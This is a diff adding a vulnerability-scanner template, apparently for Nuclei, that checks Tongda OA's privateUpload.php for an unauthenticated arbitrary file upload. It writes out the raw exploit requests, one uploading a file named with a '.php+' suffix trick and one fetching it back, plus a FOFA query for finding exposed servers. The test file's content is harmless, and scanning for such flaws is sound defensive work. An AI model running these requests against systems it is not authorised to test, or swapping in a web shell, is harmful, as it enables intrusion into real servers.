@@ -1,0 +1,43 @@
+id: TongDa-16
+
+info:
+  name: 通达OA privateUpload存在前台任意文件上传漏洞
+  author: pussycat0x
+  severity: high
+  description: |
+    通达OA privateUpload存在前台任意文件上传漏洞
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: app="通达OA网络智能办公系统"
+  tags: TongDa,OA,任意文件上传漏洞
+request:
+  - raw:
+      - |
+        POST /general/vmeet/privateUpload.php?fileName=test1.php+ HTTP/1.1
+        Content-Type: multipart/form-data; boundary=00content0boundary00
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0
+        Host: {{RootURL}}
+        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+        Content-Length: 149
+        Connection: close
+          
+        --00content0boundary00
+        Content-Disposition: form-data; name="Filedata"; filename="1.png"
+        Content-Type: image/png
+          
+        123
+        --00content0boundary00--
+      - |
+        GET /general/vmeet/upload/temp/test1.php HTTP/1.1
+        Host: {{RootURL}}
+        User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Connection: close
+        Content-Length: 2
+    matchers-condition: and
+    matchers:
+      - type: status
+        part: status_1
+        status:
+          - 200
